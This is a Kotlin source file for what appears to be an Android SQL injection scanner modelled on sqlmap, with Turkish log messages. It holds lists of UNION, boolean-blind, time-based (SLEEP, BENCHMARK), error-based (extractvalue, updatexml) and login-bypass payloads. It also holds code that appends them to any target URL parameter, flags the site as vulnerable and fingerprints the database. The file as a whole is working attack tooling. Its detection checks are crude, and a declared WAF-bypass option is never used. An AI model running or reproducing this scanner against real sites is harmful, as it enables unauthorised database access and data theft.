package com.sqlmap.app.sqlmap.manager

import com.sqlmap.app.network.http.HttpClient
import com.sqlmap.app.utils.helpers.LoggingHelper
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext

enum class InjectionTechnique {
    UNION,
    BOOLEAN_BLIND,
    TIME_BLIND,
    ERROR_BASED,
    DNS
}

data class InjectionTest(
    val parameter: String,
    val technique: InjectionTechnique,
    val payload: String,
    val isVulnerable: Boolean = false,
    val responseTime: Long = 0,
    val description: String = ""
)

data class InjectionResult(
    val vulnerable: Boolean,
    val technique: InjectionTechnique?,
    val parameter: String?,
    val dbms: String?,
    val tests: List<InjectionTest> = emptyList()
)

class InjectionManager(
    private val httpClient: HttpClient,
    private val logger: LoggingHelper
) {
    
    private val unionPayloads = listOf(
        "' UNION ALL SELECT NULL--",
        "' UNION ALL SELECT NULL,NULL--",
        "' UNION ALL SELECT NULL,NULL,NULL--",
        "' UNION ALL SELECT 1,2,3--",
        "' UNION ALL SELECT @@version,NULL--"
    )
    
    private val blindPayloads = listOf(
        "' AND '1'='1",
        "' AND '1'='2",
        "' AND SLEEP(5)--",
        "' AND BENCHMARK(5000000,MD5('a'))--"
    )
    
    private val errorPayloads = listOf(
        "' AND extractvalue(1,concat(0x7e,(SELECT @@version)))--",
        "' AND updatexml(1,concat(0x7e,(SELECT user())),1)--",
        "' OR 1=1--",
        "admin' #"
    )
    
    suspend fun testInjection(
        targetUrl: String,
        parameter: String,
        wafBypassStrategies: List<String> = emptyList(),
        onTestUpdate: (test: InjectionTest, index: Int, total: Int) -> Unit = { _, _, _ -> }
    ): InjectionResult = withContext(Dispatchers.IO) {
        logger.log("Enjeksiyon testi başladı: $parameter")
        
        val tests = mutableListOf<InjectionTest>()
        var detectedTechnique: InjectionTechnique? = null
        var detectedDBMS: String? = null
        
        try {
            // UNION-based test
            logger.log("UNION-based enjeksiyon testi yapılıyor...")
            for (payload in unionPayloads) {
                val result = testPayload(targetUrl, parameter, payload)
                tests.add(
                    InjectionTest(
                        parameter = parameter,
                        technique = InjectionTechnique.UNION,
                        payload = payload,
                        isVulnerable = result.isVulnerable,
                        responseTime = result.responseTime,
                        description = result.description
                    )
                )
                
                if (result.isVulnerable) {
                    detectedTechnique = InjectionTechnique.UNION
                    detectedDBMS = detectDBMS(result.responseBody)
                    logger.log("UNION-based enjeksiyon bulundu!")
                    break
                }
            }
            
            // Boolean-based blind test
            if (detectedTechnique == null) {
                logger.log("Boolean-based blind enjeksiyon testi yapılıyor...")
                for (i in 0 until 2) {
                    val payload = blindPayloads[i]
                    val result = testPayload(targetUrl, parameter, payload)
                    tests.add(
                        InjectionTest(
                            parameter = parameter,
                            technique = InjectionTechnique.BOOLEAN_BLIND,
                            payload = payload,
                            isVulnerable = result.isVulnerable,
                            description = result.description
                        )
                    )
                    
                    if (result.isVulnerable) {
                        detectedTechnique = InjectionTechnique.BOOLEAN_BLIND
                        logger.log("Boolean-based blind enjeksiyon bulundu!")
                        break
                    }
                }
            }
            
            // Time-based blind test
            if (detectedTechnique == null) {
                logger.log("Time-based blind enjeksiyon testi yapılıyor...")
                val timePayloads = listOf(
                    "' AND SLEEP(5)--",
                    "' OR SLEEP(5)--"
                )
                
                for (payload in timePayloads) {
                    val start = System.currentTimeMillis()
                    val result = testPayload(targetUrl, parameter, payload)
                    val elapsed = System.currentTimeMillis() - start
                    
                    tests.add(
                        InjectionTest(
                            parameter = parameter,
                            technique = InjectionTechnique.TIME_BLIND,
                            payload = payload,
                            isVulnerable = elapsed > 4000,
                            responseTime = elapsed,
                            description = "Response time: ${elapsed}ms"
                        )
                    )
                    
                    if (elapsed > 4000) {
                        detectedTechnique = InjectionTechnique.TIME_BLIND
                        logger.log("Time-based blind enjeksiyon bulundu!")
                        break
                    }
                }
            }
            
            // Error-based test
            if (detectedTechnique == null) {
                logger.log("Error-based enjeksiyon testi yapılıyor...")
                for (payload in errorPayloads) {
                    val result = testPayload(targetUrl, parameter, payload)
                    tests.add(
                        InjectionTest(
                            parameter = parameter,
                            technique = InjectionTechnique.ERROR_BASED,
                            payload = payload,
                            isVulnerable = result.isVulnerable,
                            description = result.description
                        )
                    )
                    
                    if (result.isVulnerable) {
                        detectedTechnique = InjectionTechnique.ERROR_BASED
                        detectedDBMS = detectDBMS(result.responseBody)
                        logger.log("Error-based enjeksiyon bulundu!")
                        break
                    }
                }
            }
            
            logger.log("Enjeksiyon testi tamamlandı. Teknik: $detectedTechnique")
            
        } catch (e: Exception) {
            logger.log("Enjeksiyon testi hatası: ${e.message}")
        }
        
        return@withContext InjectionResult(
            vulnerable = detectedTechnique != null,
            technique = detectedTechnique,
            parameter = parameter,
            dbms = detectedDBMS,
            tests = tests
        )
    }
    
    private suspend fun testPayload(
        url: String,
        parameter: String,
        payload: String
    ): PayloadTestResult = withContext(Dispatchers.IO) {
        return@withContext try {
            val injectedUrl = if (url.contains("?")) {
                "$url&$parameter=$payload"
            } else {
                "$url?$parameter=$payload"
            }
            
            val start = System.currentTimeMillis()
            val response = httpClient.sendRequest(injectedUrl, "GET")
            val elapsed = System.currentTimeMillis() - start
            
            val isVulnerable = when {
                response.statusCode == 200 && response.body.contains("UNION", ignoreCase = true) -> true
                response.statusCode == 500 && response.body.contains(Regex("SQL|syntax|query", RegexOption.IGNORE_CASE)) -> true
                else -> false
            }
            
            PayloadTestResult(
                isVulnerable = isVulnerable,
                responseBody = response.body,
                statusCode = response.statusCode,
                responseTime = elapsed,
                description = "Status: ${response.statusCode}, Time: ${elapsed}ms"
            )
        } catch (e: Exception) {
            PayloadTestResult(
                isVulnerable = false,
                responseBody = "",
                statusCode = 0,
                description = "Error: ${e.message}"
            )
        }
    }
    
    private fun detectDBMS(response: String): String? {
        return when {
            response.contains(Regex("mysql|mariadb", RegexOption.IGNORE_CASE)) -> "MySQL"
            response.contains(Regex("postgresql|postgres", RegexOption.IGNORE_CASE)) -> "PostgreSQL"
            response.contains(Regex("mssql|microsoft sql|sql server", RegexOption.IGNORE_CASE)) -> "MS-SQL"
            response.contains(Regex("oracle|ojdbc", RegexOption.IGNORE_CASE)) -> "Oracle"
            response.contains(Regex("sqlite", RegexOption.IGNORE_CASE)) -> "SQLite"
            else -> null
        }
    }
}

data class PayloadTestResult(
    val isVulnerable: Boolean,
    val responseBody: String = "",
    val statusCode: Int = 0,
    val responseTime: Long = 0,
    val description: String = ""
)
